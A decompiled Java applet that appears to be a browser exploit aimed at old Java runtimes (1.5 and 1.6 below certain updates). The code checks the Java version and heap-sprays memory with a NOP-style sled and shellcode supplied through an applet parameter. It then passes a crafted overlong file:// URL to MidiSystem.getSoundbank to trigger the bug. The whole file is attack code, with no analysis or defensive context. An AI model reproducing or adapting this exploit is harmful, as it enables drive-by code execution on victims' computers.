import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class AppleT extends Applet
{
    private IntBuffer[] mem;
    
    @Override
    public void init() {
        final String s = "0";
        final String version_detect = version_detect();
        final String s2 = "9";
        final String string = s2 + s + s2 + s + s2 + s + s2 + s;
        if (version_detect != "end") {
            try {
                this.mem = this.spray(this.getParameter("sc"), string);
                MidiSystem.getSoundbank(new URL(version_detect));
                while (true) {
                    Thread.sleep(10L);
                }
            }
            catch (Exception ex) {
                System.out.println(ex);
            }
        }
    }
    
    public static String version_detect() {
        final String replaceAll = System.getProperty("java.version").replaceAll("_", ".");
        final String substring = replaceAll.substring(0, 3);
        final String substring2 = replaceAll.substring(4, replaceAll.length());
        final Double n = new Double(substring);
        final Double n2 = new Double(substring2);
        repeat('/', 303);
        final String string = "$" + "\"";
        final String string2 = string + string + string + string + string + string;
        final String string3 = "Z" + "%";
        final String string4 = string3 + string3 + string3 + string3 + string3 + string3;
        String s;
        if (n == 1.5 && n2 <= 0.21) {
            s = "file://" + repeat('/', 304) + string2;
        }
        else if (n == 1.6 && n2 <= 0.16) {
            s = "file://" + repeat('/', 302) + string4;
        }
        else {
            s = "end";
        }
        return s;
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] spray(final String s, final String s2) {
        return this.spray(HexDecode(s), HexDecode(s2));
    }
    
    public final IntBuffer[] spray(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
}
